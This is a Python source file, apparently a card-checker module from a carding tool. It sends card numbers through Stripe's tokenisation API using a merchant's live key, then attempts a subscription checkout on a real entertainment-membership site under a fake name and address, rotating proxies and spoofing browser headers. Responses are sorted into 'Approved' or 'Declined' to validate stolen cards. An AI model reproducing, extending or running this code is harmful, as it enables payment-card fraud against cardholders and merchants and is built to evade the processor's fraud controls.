import random
import string
import uuid
from requests import Session
from configs.configsbraintres import BehaviorsBraintree
from proxys.proxy import get_random_proxy  # Importar la función get_random_proxy

def generate_random_email_and_uuid():
    random_email = ''.join(random.choices(string.ascii_lowercase, k=8)) + '@gmail.com'
    random_uuid = str(uuid.uuid4())
    return random_email, random_uuid

class Stripersk:
    def main(self, card):
        try:
            email, unique_id = generate_random_email_and_uuid()
            
            # Configurar sesión HTTP con proxy
            session = Session()
            proxy_dict, cert_path = get_random_proxy()  # Obtener proxy aleatorio desde proxy.py
            if proxy_dict:
                session.proxies.update(proxy_dict)
                print(f"DEBUG: Proxy configurado: {proxy_dict}")
                if cert_path:
                    session.verify = cert_path
                    print(f"DEBUG: Certificado SSL configurado: {cert_path}")
                else:
                    session.verify = True  # Usar verificación SSL estándar
            else:
                print("DEBUG: No se pudo obtener un proxy válido, continuando sin proxy")
                session.verify = True  # Usar verificación SSL estándar

            # --- requests #1 --- #
            headers = {
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded'
            }
            response = session.post(
                'https://m.stripe.com/6',
                headers=headers,
            )
            apigate2 = response.json()
            muid = apigate2["muid"]
            guid = apigate2["guid"]
            sid = apigate2["sid"]

            self.ccs = BehaviorsBraintree().Ccs(card)
            # --- requests #2 --- #
            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'es-ES,es;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
            }

            data = f'card[name]=Manuel+Jose&card[number]={self.ccs[0]}&card[cvc]={self.ccs[3]}&card[exp_month]={self.ccs[1]}&card[exp_year]={self.ccs[2]}&guid={guid}&muid={muid}&sid={sid}&payment_user_agent=stripe.js%2Fbc142a0e10%3B+stripe-js-v3%2Fbc142a0e10%3B+split-card-element&time_on_page=80248&key=pk_live_Ii63DwkODRhaVyFBQLU6UYXz&pasted_fields=number'
            
            response = session.post(
                'https://api.stripe.com/v1/tokens',
                headers=headers,
                data=data
            )
            response_data = response.json()
            if "id" not in response_data:
                session.close()
                return "Declined! ❌", "No token ID received"
            else:
                id = response_data["id"]

            # --- requests #3 --- #
            headers = {
                'authority': 'account.entertainment.com',
                'accept': '*/*',
                'accept-language': 'es-US,es-419;q=0.9,es;q=0.8',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://account.entertainment.com',
                'referer': 'https://account.entertainment.com/checkout-payment?myshopify_domain=shop.entertainment.com&cart_token=8a436142d479f48a94ef9b708398db7e',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                'x-csrf-token': 'GyuM/v13ANz4FHmYeBCV6DvF89Kgae47GPolCfN+jSRO0UNvGNqQ8s7ObMn0GBaKtii+2KVwn29GOK3UPhtz8g=='
            }
            data = {
                'variant_id': '',
                'email': email,
                'shipping_address[first_name]': 'Manuel',
                'shipping_address[last_name]': 'Jose',
                'shipping_address[address1]': 'Street Mockingbird',
                'shipping_address[address2]': '',
                'shipping_address[phone]': '2554113120',
                'shipping_address[city]': 'New York',
                'shipping_address[province]': 'NY',
                'shipping_address[country]': 'US',
                'shipping_address[zip]': '10080',
                'shipping_address[company]': '',
                'billing_address[first_name]': 'Manuel',
                'billing_address[last_name]': 'Jose',
                'billing_address[address1]': 'Street Mockingbird',
                'billing_address[address2]': '',
                'billing_address[phone]': '2554113120',
                'billing_address[city]': 'New York',
                'billing_address[province]': 'NY',
                'billing_address[country]': 'US',
                'billing_address[zip]': '10080',
                'billing_address[company]': '',
                'token_id': id,
                'token_id2': id,
                'stripe_token': id,
                'plan_code': '',
                'product_title': '',
                'product_description': '',
                'products': '[{"title":"Entertainment Digital","description":"Annual Membership / DA14F3499 / 14 Days Free, then $34.99 per year","price":0,"variant_id":40115145179239,"type":"Digital Membership","qty":2,"src":"https://cdn.shopify.com/s/files/1/0689/3239/products/digitalproduct_66f4f288-1de7-4301-9b1b-6a640cef90f9.png?v=1624463322","requires_shipping":false,"renewal":true,"product_id":417690975,"plancode":"DA14F3499","newMemberExclusive":false,"exclusionary":false,"affiliate":""}]',
                'shipping_title': '',
                'shipping_code': '',
                'shipping_price': 0,
                'shipping_id': 0,
                'accepts_marketing': 0,
                'discount_code': '',
                'discount_amount': 0,
                'discount_type': '',
                'unixTimeStamp': 1722488400,
                'appsflyer_id': '',
                'idfa': '',
                'advertising_id': '',
                'device_ip': '',
                'app_id': '',
                'bundleIdentifier': '',
                'dev_key': '',
                'source': ''
            }

            response = session.post(
                'https://account.entertainment.com/ajax/create_subscription',
                headers=headers,
                data=data,
            )
            response_data = response.json()

            resp = response_data['message']

            if 'three_d_secure_2_source' in resp:
                msg = "Approved! ✅"
                respuesta = resp
            elif 'Charged ' in resp:
                msg = "Approved! ✅"
                respuesta = resp
            elif 'insufficient_funds' in resp:
                msg = "Approved! ✅"
                respuesta = resp
            elif "Your card's security code is incorrect." in resp:
                msg = "Approved! ✅"
                respuesta = resp
            else:
                msg = "Declined! ❌"
                respuesta = resp

            session.close()
            return msg, respuesta
        except Exception as e:
            session.close()
            return "Declined! ❌", f'Payment error❌: Gateway RISK - Error: {str(e)}'